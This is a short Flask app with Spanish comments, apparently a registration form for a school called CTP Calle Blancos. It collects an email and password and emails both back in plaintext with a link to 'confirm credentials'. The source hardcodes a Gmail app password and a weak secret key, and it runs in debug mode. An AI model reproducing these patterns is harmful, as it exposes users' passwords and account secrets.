from flask import Flask, render_template, request, redirect, flash
from flask_mail import Mail, Message

app = Flask(__name__)
app.secret_key = 'clave-secreta'  # necesaria para mensajes flash

# Configuración de Flask-Mail (usa tu correo y la contraseña de app de Gmail)
app.config['MAIL_SERVER'] = 'smtp.gmail.com'
app.config['MAIL_PORT'] = 587
app.config['MAIL_USE_TLS'] = True
app.config['MAIL_USERNAME'] = 'admision.ctp.calleblancos@gmail.com'  # tu correo Gmail
app.config['MAIL_PASSWORD'] = 'fgyrgjifauusfaix'  # contraseña de aplicación (no la normal)

mail = Mail(app)

@app.route('/')
def inicio():
    return render_template('Redes.html')  # asegúrate que este archivo esté en la carpeta /templates

@app.route('/index')
def index():
    return render_template('index.html')  # asegúrate que este archivo esté en la carpeta /templates

@app.route('/confirmacion')
def confirmacion():
    return render_template('confirmacion.html')  # asegúrate que este archivo esté en la carpeta /templates

@app.route('/enviar', methods=['POST'])
def enviar():
    correo = request.form['ced']
    contrasena = request.form['pass']

    asunto = "Confirmación de registro"
    mensaje = f"""
    Hola,

    Gracias por registrarte.

    Tus datos:
    Correo: {correo}
    Contraseña: {contrasena}

    Por favor ingrese al siguiente enlace para confirmar sus credenciales:
    www.ctpcalleblancos.site/confirmacion

    Saludos,
    CTP Calle Blancos
    """

    msg = Message(asunto,
                  sender=app.config['MAIL_USERNAME'],
                  recipients=[correo])
    msg.body = mensaje
    msg.charset = 'utf-8'  # solución para caracteres como la ñ

    try:
        mail.send(msg)
        flash('Correo enviado correctamente.')
    except Exception as e:
        flash(f'Error al enviar correo: {e}')

    return redirect('/')

if __name__ == '__main__':
    app.run(debug=True)
